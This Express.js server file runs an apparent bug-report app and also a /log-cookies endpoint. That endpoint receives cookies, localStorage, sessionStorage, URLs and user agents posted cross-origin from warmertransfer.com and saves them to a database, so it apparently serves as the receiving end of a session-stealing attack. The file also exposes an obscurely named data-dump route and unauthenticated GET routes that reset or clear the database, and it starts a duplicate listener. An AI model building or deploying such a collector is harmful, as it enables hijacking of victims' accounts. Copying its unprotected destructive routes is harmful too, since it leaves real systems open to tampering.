const express = require('express');
const bodyParser = require('body-parser');
const path = require('path')
const db = require('./db');
const { saveCookies } = require("./db");

const cors = require('cors');

const app = express();

app.use(express.json());
app.use(cors());
// CORS for warmertransfer.com
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "https://warmertransfer.com");
    res.header("Access-Control-Allow-Methods", "POST");
    res.header("Access-Control-Allow-Headers", "Content-Type");
    next();
});

// Log cookies endpoint
app.post("/log-cookies", async (req, res) => {
    const { url, cookies, storage, timestamp, userAgent } = req.body;
    if (cookies || storage?.localStorage || storage?.sessionStorage) {
        try {
            await saveCookies({ timestamp, url, cookies, storage, userAgent });
            res.status(200).json({ message: "Cookies logged" });
        } catch (error) {
            console.error("Error saving cookies:", error);
            res.status(500).json({ error: "Server error" });
        }
    } else {
        res.status(400).json({ error: "No cookies or storage data" });
    }
});

app.set('trust proxy', true);

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.set("view engine", "ejs");
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
    res.render("index"); // index refers to index.ejs
});


app.get('/report-a-bug/', db.createBug);

app.get('/SUPERSECRETDATABASEDEALIO', db.getAllBugs);

app.get('/reset-database', db.resetDatabase);

app.get('/SUPERSECRETDATABASEDEALIO/table', db.getAllBugsTable);

//app.get('/SUPERSECRETDATABASEDEALIO/html', db.getAllBugsHTML)

app.get('/clear-database', db.clearDatabase);

app.get('/create-database', db.createDatabase);

const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Server running on port ${port}`));

app.listen(3000, () => console.log('Example app is listening on port 3000.'));
